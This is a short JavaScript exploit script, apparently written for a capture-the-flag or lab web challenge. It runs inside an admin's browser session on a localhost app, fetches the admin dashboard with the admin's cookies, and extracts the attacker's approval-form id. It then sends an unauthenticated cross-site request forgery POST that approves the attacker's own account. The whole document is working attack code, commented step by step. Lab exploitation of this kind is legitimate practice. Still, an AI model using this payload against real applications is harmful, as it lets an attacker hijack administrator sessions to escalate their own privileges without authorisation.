// approve.js — runs inside http://localhost:3001/admin/message/<username> as admin (puppeteer bot)
(async () => {
  try {
    // 1) Learn our username from the page itself
    //    <h2><%= viewedUser.username %> Message</h2>
    const h2 = document.querySelector('h2');
    const me = h2 ? (h2.textContent || '').replace(' Message','').trim() : '';

    // 2) Pull the admin dashboard HTML (same-origin)
    const dash = await fetch('/admin/dashboard?test=a', { credentials: 'include' });
    const html = await dash.text();

    // 3) Find the <form action="/admin/approve/<id>"> that sits near our username
    //    The adminDashboard.ejs renders:
    //      <li> <%= user.username %> <form action="/admin/approve/<%= user.id %>" method="POST">...
    const re = new RegExp(
      String.raw`${me}\\s*<\\s*form[^>]*action="/admin/approve/([^"]+)"`,
      'i'
    );
    const m = html.match(re);
    if (!m) {
      console.log('[approve.js] Could not locate our approve form');
      return;
    }
    const userId = m[1];
    console.log('[approve.js] Approving userId =', userId);

    // 4) CSRF the approval (no token, admin cookies attached automatically)
    await fetch(`/admin/approve/${userId}`, {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'ok=1'
    });

    // 5) (Optional) Prove success by navigating to the dashboard (bot-side)
    // location.href = '/admin/dashboard';
  } catch (e) {
    console.log('[approve.js] Error:', e);
  }
})();
